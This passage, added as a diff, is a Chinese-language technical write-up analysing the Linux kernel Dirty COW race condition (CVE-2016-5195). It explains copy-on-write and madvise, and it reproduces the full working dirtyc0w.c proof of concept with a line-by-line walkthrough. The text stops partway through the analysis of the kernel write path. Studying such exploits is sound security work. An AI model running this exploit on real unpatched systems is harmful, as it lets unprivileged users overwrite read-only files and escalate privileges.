@@ -1,0 +1,314 @@
+
+# [原创]Linux内核[CVE-2016-5195] (dirty COW)原理分析
+
+# 环境搭建
+
+## 本机环境
+
+Ubuntu 16.04,内核版本4.15.0-45-generic
+
+## 下载内核版本4.4的源码并编译
+
+```bash
+sudo wget https://mirror.tuna.tsinghua.edu.cn/kernel/v4.x/linux-4.4.tar.xz
+```
+
+清华源，就是快！
+
+```bash
+make bzImage -j4
+```
+
+很快啊，编译好了。
+
+## 测试
+
+![](upload/attach/202012/876323_7AGZJ5VFTWZPE54.jpg)
+
+一开始是aaaaaa
+
+![](upload/attach/202012/876323_3HQHHVAT368ABJD.jpg)
+
+发现成功改掉。漏洞存在。
+
+# 简述
+
+在了解漏洞细节之前，首先要明确如下概念。
+
+### Copy-On-Write
+
+P1 P2是两个process，而P2由P1`fork()`产生。那么此时其实P1和P2是共享一块空间的。当对这同一块空间进行了修改时，才会拷贝出一份。
+
+这种考虑基于：
+
+1. 子进程中往往会调用`exec()`族的函数实现其具体的功能。(*一个进程想要执行另一个程序。既然创建新进程的唯一方法为调用`fork()`，该进程于是首先调用`fork()`创建一个自身的拷贝，然后其中一个拷贝（通常为子进程）调用`exec()`把自身替换成新的程序。这是诸如shell之类程序的典型用法*) 。**而`exec()`族函数有一个特点是，当他执行成功时，控制流直接转向新的程序的起点（比如glibc pwn中最常用的，通过hijack mallochook去打one_gadget执行`execve()`起shell）**。
+
+2. `fork()`实际只是创建了一个与父进程pid不一样的副本，如果这个时候把整个父进程的数据完整的拷贝一份到子进程的新空间，但`exec()`系列函数在执行时会**直接替换掉当前进程的地址空间**。**意味着我们做的拷贝是无效的，所以就要进行效率的优化**
+
+于是COW机制出现了。
+
+*Suppose, there is a process P1 that creates a new process P2 and then process P1 modifies page 3.
+The below figures shows what happens before and after process P modifies page 3.*
+
+![](upload/attach/202012/876323_DYC2BHZ2U9ZMJBH.jpg)
+
+### `madvise()`
+
+原型：`int madvise(void *addr, size_t length, int advice);`
+告诉内核：在从 `addr` 指定的地址开始，长度等于 `len` 参数值的范围内，该区域的用户虚拟内存应遵循特定的使用模式。
+advise参数选择如下：
+
+```text
+MADV_ACCESS_DEFAULT
+
+此标志将指定范围的内核预期访问模式重置为缺省设置。
+
+MADV_ACCESS_LWP
+
+此标志通知内核，移近指定地址范围的下一个 LWP 就是将要访问此范围次数最多的 LWP。内核将相应地为此范围和 LWP 分配内存和其他资源。
+
+MADV_ACCESS_MANY
+
+此标志建议内核，许多进程或 LWP 将在系统内随机访问指定的地址范围。内核将相应地为此范围分配内存和其他资源。
+
+MADV_DONTNEED
+
+Do not expect access in the near future. (For the time being,
+
+the application is finished with the given range, so the
+
+kernel can free resources associated with it.)
+```
+
+此系统调用相当于通知内核`addr～addr+len`的内存在接下来不再使用，内核将释放掉这一块内存以节省空间，相应的页表项也会被置空。
+
+### POC
+
+```c
+/*
+####################### dirtyc0w.c #######################
+
+$ sudo -s
+# echo this is not a test > foo
+# chmod 0404 foo
+$ ls -lah foo
+-r-----r-- 1 root root 19 Oct 20 15:23 foo
+$ cat foo
+this is not a test
+$ gcc -pthread dirtyc0w.c -o dirtyc0w
+$ ./dirtyc0w foo m00000000000000000
+mmap 56123000
+madvise 0
+procselfmem 1800000000
+$ cat foo
+m00000000000000000
+
+####################### dirtyc0w.c #######################
+*/
+
+#include <stdio.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <string.h>
+#include <stdint.h>
+
+void *map;
+int f;
+struct stat st;
+char *name;
+
+void *madviseThread(void *arg)
+{
+    char *str;
+    str=(char*)arg;
+    int i,c=0;
+    for(i=0;i<100000000;i++)
+    {
+        /*
+        You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
+        > This is achieved by racing the madvise(MADV_DONTNEED) system call
+        > while having the page of the executable mmapped in memory.
+        */
+        c+=madvise(map,100,MADV_DONTNEED);
+    }
+    printf("madvise %d\n\n",c);
+}
+
+void *procselfmemThread(void *arg)
+{
+    char *str;
+    str=(char*)arg;
+    /*
+    You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
+    > The in the wild exploit we are aware of doesn't work on Red Hat
+    > Enterprise Linux 5 and 6 out of the box because on one side of
+    > the race it writes to /proc/self/mem, but /proc/self/mem is not
+    > writable on Red Hat Enterprise Linux 5 and 6.
+    */
+    int f=open("/proc/self/mem",O_RDWR);
+    int i,c=0;
+    for(i=0;i<100000000;i++) {
+        /*
+        You have to reset the file pointer to the memory position.
+        */
+        lseek(f,(uintptr_t) map,SEEK_SET);
+        c+=write(f,str,strlen(str));
+    }
+    printf("procselfmem %d\n\n", c);
+}
+
+int main(int argc,char *argv[])
+{
+    /*
+    You have to pass two arguments. File and Contents.
+    */
+    if (argc<3) {
+        (void)fprintf(stderr, "%s\n",
+        "usage: dirtyc0w target_file new_content");
+        return 1; }
+    pthread_t pth1,pth2;
+    /*
+    You have to open the file in read only mode.
+    */
+    f=open(argv[1],O_RDONLY);
+    fstat(f,&st);
+    name=argv[1];
+    /*
+    You have to use MAP_PRIVATE for copy-on-write mapping.
+    > Create a private copy-on-write mapping. Updates to the
+    > mapping are not visible to other processes mapping the same
+    > file, and are not carried through to the underlying file. It
+    > is unspecified whether changes made to the file after the
+    > mmap() call are visible in the mapped region.
+    */
+    /*
+    You have to open with PROT_READ.
+    */
+    map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
+    printf("mmap %zx\n\n",(uintptr_t) map);
+    /*
+    You have to do it on two threads.
+    */
+    pthread_create(&pth1,NULL,madviseThread,argv[1]);
+    pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
+    /*
+    You have to wait for the threads to finish.
+    */
+    pthread_join(pth1,NULL);
+    pthread_join(pth2,NULL);
+    return 0;
+}
+```
+
+### 过程
+
+1. 首先我们创建了一个`foo`文件，并且他的权限是 **只读**。
+2. 我们以`read_only`打开，返回了`f=fd`。并获取了对应的文件描述符的状态储存到`st`结构体中（类型`struct stat`）
+
+```c
+struct stat64 {
+    unsigned long long st_dev;
+    unsigned char __pad0[4];
+    unsigned long __st_ino;
+    unsigned int st_mode;
+    unsigned int st_nlink;
+    unsigned long st_uid;
+    unsigned long st_gid;
+    unsigned long long st_rdev;
+    unsigned char __pad3[4];
+    long long st_size;
+    unsigned long st_blksize;
+    /* Number 512-byte blocks allocated. */
+    unsigned long long st_blocks;
+    unsigned long st_atime;
+    unsigned long st_atime_nsec;
+    unsigned long st_mtime;
+    unsigned int st_mtime_nsec;
+    unsigned long st_ctime;
+    unsigned long st_ctime_nsec;
+    unsigned long long st_ino;
+};
+```
+
+3. 接下来使用`mmap`将此文件的内容 **以私有的写时复制** 映射到了用户空间。其中各个参数代表的含义如下：
+
+```c
+map=mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
+
+//原型
+void *mmap(void *addr, size_t length, int prot, int flags,
+           int fd, off_t offset);
+```
+
+- `addr=NULL`，代表让内核选取一个合适的地址。
+- `length`代表要映射的进程地址空间的大小。这里是文件的大小。
+- `prot`代表映射区域的读写属性。这里是只读。
+- `flags`设置内存映射的属性。这里是`MAP_PRIVATE`创建一个私有的写时复制的映射。（多个process可以通过私有映射访问同一个文件，并且修改后 **不会同步到磁盘文件中** ）
+- `fd`代表这是一个文件映射。
+- `offset`是指在文件映射中的偏移量。
+
+4. 启动两个线程：`madviseThread` 和 `procselfmemThread`
+
+#### `procselfmemThread`线程
+
+参数为我们要写入的：`m0000000`字符串。
+
+首先他以`RDWR`打开了 `/proc/self/mem`（对于当前进程来说，`/proc/self/mem`是进程的内存内容，**通过修改该文件相当于直接修改当前进程的内存**），但是如果你测试一下会发现：
+
+```bash
+root@ubuntu:~/linux-4.4-env# cat /proc/66310/mem
+cat: /proc/66310/mem: Input/output error
+```
+
+这是因为：我们无法读取没有被正确映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。所以需要配合`lseek`来调整内存写的位置。原型如下：
+
+```c
+off_t lseek(int fd, off_t offset, int whence);
+```
+
+我们在`POC`中将位置调整到`mmap`返回的位置（也就是文件被映射的位置）。`SEEK_SET`参数告诉系统`offset`即为新的读写位置。之后进行100000000次写操作来试图改变此内存的内容。（**`mmap`的时候只有读权限**）
+
+#### `madviseThread`线程
+
+这个线程很简单就是调用100000000次`madvise`将对应的`mmap`出来的`addr`空间到`addr+100`设置为`MADV_DONTNEED`
+
+而这两个线程是跑在竞争态的。
+
+## 竞态详细分析
+
+经过以上的讲解，应该已经明白了大概是在干嘛。
+
+dirty COW正如其名：dirty（脏）、COW（写时复制）
+
+接下来深入竞争细节进行分析。
+
+当 `write(f,str,strlen(str))` 时调用流如下：
+
+```text
+__get_free_pages+14
+mem_rw.isra+69
+mem_write+27
+__vfs_write+55
+vfs_write+169
+sys_write+85
+```
+
+### `write`执行流分析
+
+#### `mem_write`
+
+```c
+static ssize_t mem_write(struct file *file, const char __user *buf,
+                         size_t count, loff_t *ppos)
+{
+    return mem_rw(file, (char __user*)buf, count, ppos, 1);
+}
+```
+
+底层调用`mem_rw`，此时的`file`结构体对应的是 `/proc/self/mem`。`buf`是用户态的要写入的内容，`count`为大小，`ppos`为偏移。
+
+#### `mem_rw`
+
